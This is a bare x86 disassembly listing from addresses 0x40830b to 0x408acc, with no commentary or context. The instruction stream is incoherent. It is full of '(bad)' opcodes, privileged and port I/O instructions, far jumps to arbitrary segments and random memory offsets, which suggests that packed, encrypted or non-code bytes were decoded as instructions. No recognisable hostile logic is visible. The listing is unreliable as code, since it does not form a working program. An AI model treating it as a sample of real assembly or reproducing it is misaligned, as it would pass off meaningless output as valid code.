  40830b:	fistp  WORD PTR ds:0xb6a6eef6
  408311:	in     al,0x83
  408313:	stc    
  408314:	pop    edi
  408315:	jne    0x408356
  408317:	mov    ds:0x29a60265,eax
  40831c:	div    bl
  40831e:	repnz mov cl,cl
  408321:	fstp   TBYTE PTR [esi]
  408323:	int    0x75
  408325:	xor    ebx,DWORD PTR [ebp-0x559d00ec]
  40832b:	or     DWORD PTR [esi+0x3a618298],eax
  408331:	pop    ds
  408332:	retf   
  408333:	std    
  408334:	or     BYTE PTR [edi-0x62],bl
  408337:	ficomp WORD PTR [esi+0x7a47c8c2]
  40833d:	shl    DWORD PTR [si],cl
  408340:	xchg   esp,eax
  408341:	push   esp
  408342:	mov    dl,BYTE PTR [ecx+0x38]
  408345:	pop    edi
  408346:	xchg   edi,eax
  408347:	dec    edi
  408348:	pop    edx
  408349:	pop    ds
  40834a:	add    eax,DWORD PTR [ebx]
  40834c:	pop    si
  40834e:	push   ss
  40834f:	fistp  WORD PTR [ebx+esi*1]
  408352:	mov    ?,WORD PTR [edi-0x3c]
  408355:	fst    DWORD PTR [edx+esi*4-0x64]
  408359:	dec    esp
  40835a:	icebp  
  40835b:	push   0xffffffb4
  40835d:	jmp    0x1782:0xbecaf179
  408364:	xor    edi,DWORD PTR [eax]
  408366:	inc    edx
  408367:	xchg   BYTE PTR [ecx+0x6d],dh
  40836a:	lds    ecx,FWORD PTR [ebx+ebx*4+0x66]
  40836e:	xlat   BYTE PTR ds:[ebx]
  40836f:	leave  
  408370:	daa    
  408371:	mov    BYTE PTR [edx-0x2672b55d],0x1c
  408378:	xchg   edx,eax
  408379:	pop    ds
  40837a:	mov    dh,0x43
  40837c:	xor    ecx,edx
  40837e:	push   eax
  40837f:	dec    ecx
  408380:	inc    edi
  408381:	fdivr  QWORD PTR [edx+0x1e]
  408384:	fistp  WORD PTR ds:0xf21cc469
  40838a:	inc    esi
  40838b:	retf   
  40838c:	aaa    
  40838d:	adc    edi,edi
  40838f:	pop    edx
  408390:	mov    ecx,0xba841b99
  408395:	dec    esp
  408396:	xchg   edi,eax
  408397:	and    bh,bh
  408399:	(bad)  
  40839a:	inc    ecx
  40839b:	jl     0x40837b
  40839d:	xor    al,0xc4
  40839f:	push   cs
  4083a0:	xchg   edi,eax
  4083a1:	dec    esp
  4083a2:	mov    ch,0x90
  4083a4:	and    al,0x44
  4083a6:	adc    al,BYTE PTR [ecx+0x2099332f]
  4083ac:	neg    BYTE PTR [esi]
  4083ae:	stos   DWORD PTR es:[edi],eax
  4083af:	mov    ebx,0x585d8fa6
  4083b4:	int    0xc0
  4083b6:	(bad)  
  4083b7:	lods   al,BYTE PTR ds:[esi]
  4083b8:	int3   
  4083b9:	pop    es
  4083ba:	out    dx,al
  4083bb:	xchg   esp,eax
  4083bc:	mov    dh,0x94
  4083be:	fisubr DWORD PTR [ebx+0x48]
  4083c1:	push   edi
  4083c2:	loop   0x4083fd
  4083c4:	jb     0x408425
  4083c6:	push   0x5d
  4083c8:	add    DWORD PTR [esi+0x6ef7bdb1],ebx
  4083ce:	in     al,0x17
  4083d0:	xor    ah,dl
  4083d2:	pop    edi
  4083d3:	jl     0x408405
  4083d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083d6:	lods   al,BYTE PTR ds:[esi]
  4083d7:	add    DWORD PTR [eax],esi
  4083d9:	in     al,dx
  4083da:	add    ebp,DWORD PTR [ebx]
  4083dc:	fbld   TBYTE PTR [edx-0x1de3187f]
  4083e2:	push   ebp
  4083e3:	and    esp,DWORD PTR [edi]
  4083e5:	cld    
  4083e6:	xchg   DWORD PTR [ebx],edi
  4083e8:	aad    0xa2
  4083ea:	or     al,0x28
  4083ec:	fs cmc 
  4083ee:	mov    al,ds:0xde6a6c47
  4083f3:	fadd   DWORD PTR [ebx+0x10dce04e]
  4083f9:	int    0xc1
  4083fb:	add    ah,al
  4083fd:	popf   
  4083fe:	xor    DWORD PTR [ebx-0x73ef9f79],eax
  408404:	jl     0x4083bb
  408406:	push   esp
  408407:	test   bl,ch
  408409:	cmc    
  40840a:	int3   
  40840b:	mov    DWORD PTR [esi],0x19a76819
  408411:	sub    DWORD PTR [esi+0x12dae7a7],ecx
  408417:	(bad)  
  408418:	in     al,0x65
  40841a:	rol    DWORD PTR [esi+eax*8],1
  40841d:	push   edx
  40841e:	hlt    
  40841f:	stos   BYTE PTR es:[edi],al
  408420:	dec    ah
  408422:	mov    ah,0x2b
  408424:	cdq    
  408425:	mov    edi,0xf5142c73
  40842a:	cmp    eax,0x7c367456
  40842f:	int3   
  408430:	inc    edx
  408431:	xlat   BYTE PTR ds:[ebx]
  408432:	fsubr  QWORD PTR [esi]
  408435:	mov    al,BYTE PTR [ebp+0x5c]
  408438:	test   eax,0x61cee3b2
  40843d:	stc    
  40843e:	mov    esp,0xdc8a5b50
  408443:	icebp  
  408444:	in     al,0x99
  408446:	push   ecx
  408447:	lock ss in al,dx
  40844a:	mov    esp,0x9e53a189
  40844f:	ds and edi,0x27
  408453:	pop    eax
  408454:	or     eax,0x3e469822
  408459:	sub    bh,BYTE PTR [esi+0x49]
  40845c:	call   0xed3e1819
  408461:	cmp    DWORD PTR [ebp+edi*8-0x7a],eax
  408465:	jo     0x40840d
  408467:	sub    al,cl
  408469:	sub    edi,ebp
  40846b:	aad    0xdb
  40846d:	out    0x1b,eax
  40846f:	adc    eax,0x6adb0361
  408474:	jg     0x40842e
  408476:	push   eax
  408477:	xchg   ecx,eax
  408478:	xchg   ebx,eax
  408479:	sub    DWORD PTR [ecx+0x11cb2c43],0x83d8bbf0
  408483:	push   edx
  408484:	mov    ds:0x4b0067fc,al
  408489:	mov    edi,0x755afff
  40848e:	hlt    
  40848f:	loopne 0x408497
  408491:	pop    esp
  408492:	clc    
  408493:	mov    esp,0xa2fe208b
  408498:	xor    eax,0x400cf50a
  40849d:	ss push ecx
  40849f:	or     eax,DWORD PTR [ecx]
  4084a1:	fwait
  4084a2:	imul   eax,DWORD PTR [esp+edi*2],0x792a5243
  4084a9:	aas    
  4084aa:	repnz (bad) 
  4084ac:	outs   dx,BYTE PTR ds:[esi]
  4084ad:	xchg   ebp,eax
  4084ae:	and    di,WORD PTR ds:0x70cf30cd
  4084b5:	pop    ss
  4084b6:	shl    DWORD PTR [ecx-0x63],0x20
  4084ba:	repnz mov edx,0x6abcea5b
  4084c0:	adc    ebp,DWORD PTR [ebx+eax*8+0x508be1e9]
  4084c7:	inc    edx
  4084c8:	gs inc ebp
  4084ca:	fild   QWORD PTR [edx+ecx*2+0x6b]
  4084ce:	and    ecx,ebx
  4084d0:	cmp    eax,0x65c68e6
  4084d5:	fild   QWORD PTR [edi]
  4084d7:	sub    al,0xed
  4084d9:	into   
  4084da:	jo     0x408546
  4084dc:	pop    edi
  4084dd:	fist   DWORD PTR [esi-0x6c]
  4084e0:	scas   al,BYTE PTR es:[edi]
  4084e1:	push   ebp
  4084e2:	ss pushf 
  4084e4:	sbb    dh,BYTE PTR [ecx-0x48]
  4084e7:	add    al,ah
  4084e9:	stos   BYTE PTR es:[edi],al
  4084ea:	aas    
  4084eb:	addr16 and al,0x8a
  4084ee:	test   al,0x83
  4084f0:	shl    BYTE PTR ds:0x37519d2,1
  4084f6:	aaa    
  4084f7:	rcr    DWORD PTR [eax-0x2201be46],0x75
  4084fe:	in     al,dx
  4084ff:	(bad)
  408504:	xor    al,BYTE PTR [ebp+0x1601a53]
  40850a:	xchg   edi,eax
  40850b:	outs   dx,BYTE PTR ds:[esi]
  40850c:	retf   0xe606
  40850f:	icebp  
  408510:	aad    0x16
  408512:	cmp    eax,0x39b019f2
  408517:	mov    dh,0xbe
  408519:	int    0x73
  40851b:	mov    eax,0x77a7f900
  408520:	mov    dl,0xcd
  408522:	int3   
  408523:	mov    ebp,0x8e0e63e6
  408528:	sub    bh,BYTE PTR [ebx]
  40852a:	jmp    0x3d86:0xf8f6daf8
  408531:	xchg   BYTE PTR ds:0x8b5da90c,al
  408537:	inc    edi
  408538:	mov    ds:0x44f3c86a,al
  40853d:	ins    BYTE PTR es:[edi],dx
  40853e:	gs pop ds
  408540:	cli    
  408541:	push   ebx
  408542:	lods   al,BYTE PTR ds:[esi]
  408543:	stos   DWORD PTR es:[edi],eax
  408544:	fwait
  408545:	mov    dh,0xf8
  408547:	js     0x40850e
  408549:	cld    
  40854a:	sub    eax,0x87ef3faa
  40854f:	sub    al,0xd7
  408551:	jmp    DWORD PTR [esi+0x69]
  408554:	pop    eax
  408555:	fstp   QWORD PTR [ebp+ebx*1+0x11410d7f]
  40855c:	dec    ebx
  40855d:	jmp    0x2cfa6f46
  408562:	mov    ah,0xc7
  408564:	push   ecx
  408565:	(bad)  cs:0x3360e5c1
  40856c:	ficomp DWORD PTR [eax+ebp*2]
  40856f:	test   eax,0x4ab57999
  408574:	nop
  408575:	shr    esi,cl
  408577:	cmp    esp,DWORD PTR [ebx+0x4a36f4a]
  40857d:	xor    esp,eax
  40857f:	je     0x408565
  408581:	std    
  408582:	xor    eax,0xcb0b3ed4
  408587:	xchg   ebp,eax
  408589:	dec    edi
  40858a:	(bad)  
  40858b:	pop    ebp
  40858c:	fnstsw WORD PTR [ecx]
  40858e:	push   ebp
  40858f:	aaa    
  408590:	clc    
  408591:	pusha  
  408592:	(bad)  
  408593:	retf   
  408594:	aam    0xb
  408596:	adc    al,0x32
  408598:	ins    DWORD PTR es:[edi],dx
  408599:	ret    0x4b05
  40859c:	mov    ecx,0x4f0fa892
  4085a1:	bnd ss je 0x40859f
  4085a5:	push   ecx
  4085a6:	(bad)  
  4085a7:	or     eax,0xf2106f6b
  4085ac:	adc    edi,DWORD PTR [ebx]
  4085ae:	cli    
  4085af:	inc    edi
  4085b0:	das    
  4085b1:	pop    ss
  4085b2:	pop    eax
  4085b3:	test   eax,0xfa73e9c8
  4085b8:	add    ecx,DWORD PTR [ebp-0x5f]
  4085bb:	push   ebx
  4085bc:	sbb    ebp,DWORD PTR [eax]
  4085be:	dec    eax
  4085bf:	cmp    dh,0xa4
  4085c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085c3:	loop   0x408609
  4085c5:	scas   eax,DWORD PTR es:[edi]
  4085c6:	test   eax,0xff174150
  4085cb:	ret    
  4085cc:	sub    DWORD PTR [ebp+0x7a],esi
  4085cf:	js     0x408552
  4085d1:	out    dx,eax
  4085d2:	shl    DWORD PTR [ecx+0x69],0x61
  4085d6:	adc    al,0x12
  4085d8:	xchg   ecx,eax
  4085d9:	(bad)  
  4085da:	mov    edx,0x7cb10f69
  4085df:	xchg   esi,eax
  4085e0:	cld    
  4085e1:	sub    eax,DWORD PTR [eax+ebx*8]
  4085e4:	in     al,0xa0
  4085e6:	out    dx,eax
  4085e7:	add    ebp,DWORD PTR [ebx]
  4085e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085ea:	into   
  4085eb:	leave  
  4085ec:	cmp    ebp,DWORD PTR [ebx+ebp*8+0x235e18cc]
  4085f3:	int3   
  4085f4:	imul   ebp,DWORD PTR [edi+0x1b841aef],0x877ad885
  4085fe:	les    ebp,FWORD PTR es:[ecx-0x19]
  408602:	mov    bh,0x43
  408604:	stc    
  408605:	xchg   DWORD PTR [ebx-0x7442bd7e],ebx
  40860b:	add    DWORD PTR [ecx],0xc58eb333
  408611:	xor    al,0xf7
  408613:	aam    0x99
  408615:	popf   
  408616:	(bad)  
  408617:	xchg   esp,eax
  408618:	push   eax
  408619:	xchg   esp,edi
  40861b:	jno    0x4085a3
  40861d:	das    
  40861e:	in     eax,dx
  40861f:	not    BYTE PTR [ebx]
  408621:	or     BYTE PTR [edi],ah
  408623:	shr    DWORD PTR [edi-0x7117e5da],1
  408629:	pop    ebx
  40862a:	cs pop edx
  40862c:	push   ecx
  40862d:	xchg   ebx,eax
  40862e:	pop    ss
  40862f:	sbb    edi,esi
  408631:	ins    BYTE PTR es:[edi],dx
  408632:	or     DWORD PTR [edi],esi
  408634:	mov    bh,0x7b
  408636:	out    0x9f,al
  408638:	fptan  
  40863a:	test   al,0xa3
  40863c:	imul   BYTE PTR [eax+esi*1]
  40863f:	jae    0x408609
  408641:	fst    QWORD PTR [ebx+ebp*8+0x49]
  408645:	hlt    
  408646:	or     eax,0x7860db1
  40864b:	call   0xef705a29
  408650:	cmc    
  408651:	test   al,0x5e
  408653:	dec    esp
  408654:	je     0x4086c1
  408656:	sub    edi,edx
  408658:	adc    DWORD PTR [ebp+0x2e],ebx
  40865b:	aam    0x73
  40865d:	cmp    BYTE PTR [eax-0x53],dl
  408660:	fbld   TBYTE PTR [edx-0x2]
  408663:	dec    ecx
  408664:	mov    WORD PTR [edi+0x35],es
  408667:	daa    
  408668:	icebp  
  408669:	mov    al,0xfb
  40866b:	imul   eax,DWORD PTR [ebp-0x63d56078],0x62
  408672:	and    ecx,esp
  408674:	into   
  408675:	sub    DWORD PTR [ebp+0x4e],0xb562692c
  40867c:	add    ebx,edi
  40867e:	sbb    al,0xde
  408680:	mov    edx,0xf9dbab8e
  408685:	ins    BYTE PTR es:[edi],dx
  408686:	lea    edi,[edx+0x71]
  408689:	cmp    DWORD PTR [edi+0x61],edx
  40868c:	add    esp,DWORD PTR [edi+ecx*2+0x20]
  408690:	mov    ds:0xb51b61de,al
  408695:	inc    ecx
  408696:	pcmpgtd mm0,QWORD PTR [ebx+0x28]
  40869a:	ja     0x4086b6
  40869c:	sbb    BYTE PTR [ebp-0x69],ah
  40869f:	dec    esi
  4086a0:	aaa    
  4086a1:	cmp    eax,0xfa1061df
  4086a6:	jb     0x408680
  4086a8:	pusha  
  4086a9:	inc    ecx
  4086aa:	pop    ebx
  4086ab:	leave  
  4086ac:	out    dx,eax
  4086ad:	pop    eax
  4086ae:	jmp    0xa0ecd5ff
  4086b3:	add    ebp,ebx
  4086b5:	and    esi,DWORD PTR [eax]
  4086b7:	sbb    DWORD PTR [eax-0x6c],ebp
  4086ba:	ds popa 
  4086bc:	add    al,0x74
  4086be:	jl     0x40871d
  4086c0:	mov    esp,DWORD PTR [edx+ebx*1-0xfc5e8dd]
  4086c7:	iret   
  4086c8:	js     0x4086d7
  4086ca:	mov    ds:0x5a142409,al
  4086cf:	sub    BYTE PTR [edi+0x2d],dl
  4086d2:	xchg   ebp,eax
  4086d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086d4:	dec    esp
  4086d5:	sbb    al,0x3d
  4086d7:	mov    cl,0xaf
  4086d9:	inc    edx
  4086da:	pop    es
  4086db:	or     cl,bl
  4086dd:	cmp    eax,0x52fa62c8
  4086e2:	pop    edi
  4086e3:	inc    ebp
  4086e4:	adc    ecx,DWORD PTR [ebx]
  4086e6:	xchg   esp,eax
  4086e7:	cmp    ebx,DWORD PTR [edi+ebp*2-0xc72c4bc]
  4086ee:	enter  0xfa02,0x65
  4086f2:	cmp    eax,0x1ae60fb0
  4086f7:	fcomp  QWORD PTR [edi-0x5cda1378]
  4086fd:	das    
  4086fe:	mov    ds,WORD PTR [ecx]
  408700:	dec    edi
  408701:	push   edx
  408702:	sub    DWORD PTR [ebp+0x3e],edi
  408705:	out    dx,eax
  408706:	dec    ebx
  408707:	inc    esi
  408708:	jb     0x40874f
  40870a:	add    ebp,DWORD PTR [eax]
  40870c:	pop    esi
  40870d:	retf   0xf4b8
  408710:	add    DWORD PTR [ebp-0x2d],esi
  408713:	pop    edi
  408714:	imul   esi,DWORD PTR ds:0xd6b92585,0x4c
  40871b:	dec    ecx
  40871c:	sub    bh,BYTE PTR [ebp+ebx*1-0x17]
  408720:	out    0x31,eax
  408722:	dec    esi
  408723:	xor    eax,edi
  408725:	neg    BYTE PTR ds:0x78059d89
  40872b:	or     BYTE PTR [ebp+0x76],bl
  40872e:	enter  0xe200,0xe
  408732:	lds    ebp,FWORD PTR ds:[edi+ecx*1]
  408736:	daa    
  408737:	sbb    dl,0x4
  40873a:	dec    ecx
  40873b:	pop    ebp
  40873c:	adc    al,0x62
  40873e:	test   al,0xa0
  408740:	push   ss
  408741:	test   BYTE PTR [esi],ah
  408743:	and    al,0x3c
  408745:	adc    bl,BYTE PTR [ebp+0x7e]
  408748:	jne    0x4086d7
  40874a:	loop   0x408785
  40874c:	sbb    cl,BYTE PTR [edx-0x7a]
  40874f:	xor    DWORD PTR [edi+ebp*8],edx
  408752:	dec    edi
  408753:	sub    al,0x5d
  408755:	xchg   ebx,eax
  408756:	jo     0x4087c3
  408758:	aaa    
  408759:	into   
  40875a:	mov    ch,0xdb
  40875c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40875d:	cmp    eax,0x9320c579
  408762:	stos   BYTE PTR es:[edi],al
  408763:	cld    
  408764:	fimul  WORD PTR [eax]
  408766:	imul   esi,esp,0xffffffd8
  408769:	es stos BYTE PTR es:[edi],al
  40876b:	pop    ebp
  40876c:	ret    0xb89f
  40876f:	or     DWORD PTR [esi],ebx
  408771:	push   eax
  408772:	mov    eax,ds:0xa7917180
  408777:	sbb    dh,BYTE PTR [ecx+0x78b5f0dd]
  40877d:	mov    ds:0xcc185a73,al
  408782:	push   ds
  408783:	popa   
  408784:	dec    edx
  408785:	das    
  408786:	mov    dl,0xee
  408788:	xchg   edx,eax
  408789:	and    eax,0x8f9246f6
  40878e:	add    DWORD PTR [eax+0x2315a7],ebp
  408794:	mov    bh,0x11
  408796:	in     al,dx
  408797:	pop    esp
  408798:	pop    ebx
  408799:	std    
  40879a:	and    al,0x47
  40879c:	sbb    BYTE PTR [edi+edi*8-0xa],bl
  4087a0:	(bad)  
  4087a1:	retf   
  4087a2:	jge    0x40872c
  4087a4:	jmp    0x408749
  4087a6:	and    eax,0x679f3221
  4087ab:	mov    ah,0xc0
  4087ad:	out    0xb3,al
  4087af:	sub    DWORD PTR [ecx-0x21],ecx
  4087b2:	mov    bl,BYTE PTR [ebp-0x3cdc035c]
  4087b8:	jg     0x4087ab
  4087ba:	ror    cl,1
  4087bc:	dec    edi
  4087bd:	and    BYTE PTR [esi],ah
  4087bf:	pop    edx
  4087c0:	add    ch,BYTE PTR [esi+0x55]
  4087c3:	xchg   ecx,eax
  4087c4:	dec    esi
  4087c5:	jle    0x4087f0
  4087c7:	and    eax,DWORD PTR [edx-0x3e]
  4087ca:	pop    ebp
  4087cb:	leave  
  4087cc:	push   ebp
  4087cd:	lahf   
  4087ce:	inc    ebx
  4087cf:	addr16 icebp 
  4087d1:	daa    
  4087d2:	fld    DWORD PTR [esi]
  4087d4:	clc    
  4087d5:	(bad)  
  4087d6:	daa    
  4087d7:	and    eax,0x22
  4087da:	mov    bl,BYTE PTR [ebx+0x64eb4f4a]
  4087e0:	(bad)  
  4087e1:	cli    
  4087e2:	and    DWORD PTR [edi+0x6a7f355e],ebx
  4087e8:	shr    BYTE PTR [edi],0xef
  4087eb:	jl     0x408810
  4087ed:	xchg   esp,eax
  4087ee:	inc    eax
  4087ef:	xor    al,0x80
  4087f1:	sbb    DWORD PTR ds:0x4772f8ba,edx
  4087f7:	fstp   TBYTE PTR [ecx-0x61]
  4087fa:	xor    eax,0xd08ceb86
  4087ff:	mov    esi,0xb88f4e9c
  408804:	fldpi  
  408806:	lock mov cl,BYTE PTR [ebp+0x53fae688]
  40880d:	sub    DWORD PTR [ebx+eax*4-0x5e],ebx
  408811:	jmp    0xf6e329f4
  408816:	and    al,0x53
  408818:	pop    esp
  408819:	mov    ebp,0x999e4b64
  40881e:	push   es
  40881f:	sbb    eax,0xd9bf2b46
  408824:	push   ebx
  408825:	xchg   edx,eax
  408826:	jp     0x408852
  408828:	aas    
  408829:	sar    BYTE PTR [ecx-0x75],0x6d
  40882d:	inc    esi
  40882e:	je     0x408834
  408830:	xlat   BYTE PTR ds:[ebx]
  408831:	lods   al,BYTE PTR ds:[esi]
  408832:	sbb    DWORD PTR [esi+0x4c],edx
  408835:	outs   dx,DWORD PTR ds:[esi]
  408836:	xor    BYTE PTR gs:0xdbccd6d3,bh
  40883d:	xor    al,0x2d
  40883f:	ret    
  408840:	sub    ebp,eax
  408842:	inc    ebp
  408843:	(bad)  
  408844:	loope  0x4088b1
  408846:	das    
  408847:	add    eax,0xd82b9e25
  40884c:	xlat   BYTE PTR ds:[ebx]
  40884d:	cld    
  40884e:	inc    esp
  40884f:	xor    edx,DWORD PTR [ebx-0x7f]
  408852:	cmc    
  408853:	or     eax,0x48d2ca6b
  408858:	sub    al,0xb4
  40885a:	cld    
  40885b:	aam    0x55
  40885d:	(bad)  
  40885e:	fisubr WORD PTR [ebx+0x60eafe69]
  408864:	cmp    esp,DWORD PTR [eax]
  408866:	out    dx,eax
  408867:	lods   eax,DWORD PTR ds:[esi]
  408868:	repz push ds
  40886a:	dec    ebx
  40886b:	fidivr DWORD PTR [edi+ecx*1]
  40886e:	sbb    al,0xe2
  408870:	fiadd  WORD PTR [eax+eax*2-0x7eb26261]
  408877:	mov    bl,0x8a
  408879:	pcmpeqb mm1,mm0
  40887c:	shl    BYTE PTR [eax+0x1ebcfd44],cl
  408882:	pop    ecx
  408883:	pop    es
  408884:	lds    edx,FWORD PTR [bx+di-0x43e2]
  408889:	jb     0x40886b
  40888b:	js     0x4088bd
  40888d:	mov    cs,ebx
  40888f:	dec    edx
  408890:	rcr    DWORD PTR [ecx-0x5d],1
  408893:	pop    esp
  408894:	out    0x2f,al
  408896:	push   ebp
  408897:	jg     0x40888f
  408899:	loop   0x40888c
  40889b:	fwait
  40889c:	xor    eax,0x21ff9b49
  4088a1:	jbe    0x40890b
  4088a3:	mov    esp,0x42a471ff
  4088a8:	push   edx
  4088a9:	and    BYTE PTR [ecx+0x6cf2776f],ah
  4088af:	mov    eax,ds:0xfa55fba9
  4088b4:	or     esp,0xcab93106
  4088ba:	inc    edx
  4088bb:	ins    DWORD PTR es:[edi],dx
  4088bc:	sbb    BYTE PTR [edi+0x65],dl
  4088bf:	test   eax,0xccd62a72
  4088c4:	or     ebp,esp
  4088c6:	jecxz  0x40887a
  4088c8:	ret    
  4088c9:	and    DWORD PTR [ecx+0x19],edi
  4088cc:	inc    edx
  4088cd:	psraw  mm2,QWORD PTR [ebx]
  4088d0:	dec    edi
  4088d1:	adc    DWORD PTR [edi],eax
  4088d3:	es push eax
  4088d5:	stos   DWORD PTR es:[edi],eax
  4088d6:	adc    al,0x10
  4088d8:	popf   
  4088d9:	inc    ebp
  4088da:	xchg   esp,eax
  4088db:	lock or al,0x7b
  4088de:	mov    edi,ebp
  4088e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088e1:	loop   0x40893d
  4088e3:	in     eax,0x82
  4088e5:	in     eax,0x8f
  4088e7:	mov    edx,0x4720cc92
  4088ec:	push   ecx
  4088ed:	push   cs
  4088ee:	(bad)  
  4088ef:	not    bl
  4088f1:	arpl   cx,dx
  4088f3:	adc    esi,DWORD PTR [ebp-0x46]
  4088f6:	adc    cl,BYTE PTR [edi+ebx*8]
  4088f9:	shl    al,1
  4088fb:	hlt    
  4088fc:	stc    
  4088fd:	sub    esp,DWORD PTR [eax-0x1bb5b1ee]
  408903:	xor    edx,edx
  408905:	inc    eax
  408906:	jns    0x4088e6
  408908:	in     al,dx
  408909:	push   ecx
  40890a:	fdiv   QWORD PTR [ebp+0x6ca0c837]
  408910:	loope  0x4088e4
  408912:	mov    DWORD PTR [edi],ebp
  408914:	push   edx
  408915:	or     al,0x7
  408917:	jnp    0x408937
  408919:	imul   eax,esp,0x6b
  40891c:	push   ebp
  40891d:	jo     0x4088b2
  40891f:	loope  0x4088e8
  408921:	sti    
  408922:	cld    
  408923:	pop    esi
  408924:	add    al,0xbe
  408926:	xor    eax,0xc7aad966
  40892b:	sbb    eax,0xd5fa70e0
  408930:	adc    ah,ch
  408932:	xchg   esi,eax
  408933:	loop   0x4088d4
  408935:	sbb    cl,bl
  408937:	inc    ebx
  408938:	(bad)  
  408939:	jle    0x408974
  40893b:	add    ch,bh
  40893d:	cdq    
  40893e:	jmp    0x75f4edbf
  408943:	call   0xd77ed82
  408948:	dec    edi
  408949:	fadd   QWORD PTR [ecx-0x4e]
  40894c:	test   BYTE PTR [ecx],0x68
  40894f:	inc    esi
  408950:	mov    edx,0xbf1d7e2f
  408955:	fld    TBYTE PTR [eax+0x10656746]
  40895b:	jmp    0xbc73adb0
  408960:	or     eax,0x214c057f
  408965:	(bad)  
  408966:	rcl    cl,1
  408968:	outs   dx,DWORD PTR ds:[esi]
  408969:	sub    eax,esi
  40896b:	in     eax,dx
  40896c:	cmp    DWORD PTR [eax+0x1a],0x6e6a7c2c
  408973:	xor    DWORD PTR [bp+si+0x1f],ebx
  408977:	mov    al,0xa5
  408979:	(bad)  
  40897a:	pop    edx
  40897b:	test   al,0x2f
  40897d:	jp     0x408900
  40897f:	aaa    
  408980:	sub    BYTE PTR [esi],dl
  408982:	mov    ebx,0x40494057
  408987:	mov    eax,ds:0x7f090d77
  40898c:	dec    esi
  40898d:	addr16 ss mov ebx,0x9339ed1d
  408994:	shl    BYTE PTR es:[edx],cl
  408997:	outs   dx,BYTE PTR ds:[esi]
  408998:	dec    edi
  408999:	jmp    0x584d:0xe7b97cb0
  4089a0:	cs jnp 0x408a06
  4089a3:	xor    ecx,DWORD PTR ds:0x1da7a56
  4089a9:	mov    esi,0x9221433a
  4089ae:	mov    al,0xbc
  4089b0:	add    DWORD PTR [edx-0x48],ebx
  4089b3:	push   esi
  4089b4:	xchg   BYTE PTR [ecx+0x15],bh
  4089b7:	shl    DWORD PTR [ebx-0x2a],1
  4089ba:	addr16 inc edi
  4089bc:	pop    eax
  4089bd:	or     BYTE PTR [ecx],dl
  4089bf:	jp     0x408957
  4089c1:	xchg   ebx,eax
  4089c2:	addr16 jne 0x408a24
  4089c5:	idiv   bl
  4089c7:	sub    BYTE PTR [edi-0x12],dl
  4089ca:	(bad)  [ecx]
  4089cc:	rcr    BYTE PTR [edx-0xfb8f6b],0xfa
  4089d3:	lock jne 0x40895d
  4089d6:	pop    ss
  4089d7:	and    edi,DWORD PTR [esi]
  4089d9:	std    
  4089da:	push   ebx
  4089db:	jge    0x4089c9
  4089dd:	cmp    DWORD PTR [esi-0x37053213],0x6d9f030f
  4089e7:	mov    eax,ds:0x1c050fb7
  4089ec:	mov    bl,0x83
  4089ee:	pop    ds
  4089ef:	ds add al,0xd2
  4089f2:	adc    bh,bl
  4089f4:	sbb    DWORD PTR [ecx-0x485f0ea4],ebx
  4089fa:	adc    DWORD PTR [edx],edi
  4089fc:	and    cl,al
  4089fe:	sbb    BYTE PTR [edi+0x6a],ah
  408a01:	adc    ah,BYTE PTR [ebx]
  408a03:	dec    eax
  408a04:	ret    
  408a05:	fs xor al,0x67
  408a08:	int    0xf4
  408a0a:	in     al,dx
  408a0b:	enter  0xd8e,0xb7
  408a0f:	pop    ecx
  408a10:	jb     0x4089af
  408a12:	leave  
  408a13:	dec    ebp
  408a14:	shl    esi,0x40
  408a17:	and    DWORD PTR [eax-0x79505d0d],ebx
  408a1d:	scas   eax,DWORD PTR es:[edi]
  408a1e:	clc    
  408a1f:	outs   dx,BYTE PTR ds:[esi]
  408a20:	es add bh,0xa4
  408a24:	inc    esp
  408a25:	jmp    0x947b:0xfc49fd5e
  408a2c:	xchg   ebp,eax
  408a2d:	dec    eax
  408a2e:	jno    0x4089e2
  408a30:	fimul  DWORD PTR [ebp*8-0x573ba994]
  408a37:	add    DWORD PTR [eax+0x39],0xfd2a97d4
  408a3e:	bound  ebp,QWORD PTR [ebx-0x386f4a35]
  408a44:	(bad)  
  408a45:	dec    esp
  408a46:	mov    WORD PTR [ebx+eax*2],fs
  408a49:	and    ecx,DWORD PTR [edx]
  408a4b:	pop    edi
  408a4c:	jg     0x4089e2
  408a4e:	adc    al,0x72
  408a50:	mov    DWORD PTR [ecx+edi*2+0x13afb332],ebp
  408a57:	loopne 0x408a9e
  408a59:	aad    0x40
  408a5b:	jmp    0x408a3d
  408a5d:	test   DWORD PTR [ecx-0x6a],0x519df716
  408a64:	sub    eax,DWORD PTR [ebp+0x56]
  408a67:	mov    al,ds:0x92179c1e
  408a6c:	hlt    
  408a6d:	mov    eax,0x89602ef9
  408a72:	xor    al,0xb4
  408a74:	sti    
  408a75:	lahf   
  408a76:	jl     0x408abb
  408a78:	pop    esp
  408a79:	add    edx,ebp
  408a7b:	loopne 0x408aa2
  408a7d:	imul   edi,DWORD PTR [edi+0xeccfd17],0x53
  408a84:	lods   eax,DWORD PTR ds:[esi]
  408a85:	inc    eax
  408a86:	push   eax
  408a87:	stos   DWORD PTR es:[edi],eax
  408a88:	adc    dh,cl
  408a8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a8b:	repz pushf 
  408a8d:	ins    DWORD PTR es:[edi],dx
  408a8e:	mov    esi,0xa5c3078
  408a93:	rcr    DWORD PTR [ecx],1
  408a95:	into   
  408a96:	call   0x8be8af6a
  408a9b:	mov    bl,bl
  408a9d:	jg     0x408b16
  408a9f:	fcomp  DWORD PTR [edx+0x74]
  408aa2:	sub    BYTE PTR [edi-0xb],cl
  408aa5:	ins    BYTE PTR es:[edi],dx
  408aa6:	aad    0x84
  408aa8:	adc    al,0x65
  408aaa:	mov    DWORD PTR ds:0x245149b4,0x5963cb1f
  408ab4:	scas   al,BYTE PTR es:[edi]
  408ab5:	popa   
  408ab6:	pop    ebp
  408ab7:	inc    edx
  408ab8:	mov    edi,0x6758ec21
  408abd:	stc    
  408abe:	scas   eax,DWORD PTR es:[edi]
  408abf:	push   eax
  408ac0:	adc    al,0x9
  408ac2:	push   eax
  408ac3:	mov    ch,0xad
  408ac5:	jg     0x408aa4
  408ac7:	lods   eax,DWORD PTR ds:[esi]
  408ac8:	out    0x3b,eax
  408aca:	jo     0x408b07
  408acc:	out    dx,eax
